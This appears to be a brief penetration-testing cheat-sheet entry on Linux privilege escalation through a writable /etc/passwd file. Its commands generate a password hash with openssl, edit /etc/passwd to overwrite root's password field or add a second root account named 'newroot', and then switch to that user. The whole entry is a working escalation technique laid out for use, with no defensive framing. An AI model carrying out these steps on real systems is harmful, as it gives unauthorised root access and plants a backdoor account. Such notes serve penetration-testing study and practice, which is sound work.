[[Weak File Permissions| Enum]] `/etc/passwd` file permissions, if writable:
```bash
# make a new passwd hash
openssl passwd <passwd>

# then open /etc/passwd
vim /etc/passwd

# you can replace the x for the root user with the hash you created
# or you can copy the root line, paste it at the end and change the username to something like "newroot" and replace the x with the hash.

# then just switch users and use the password hashed. 
su root
su newroot
```
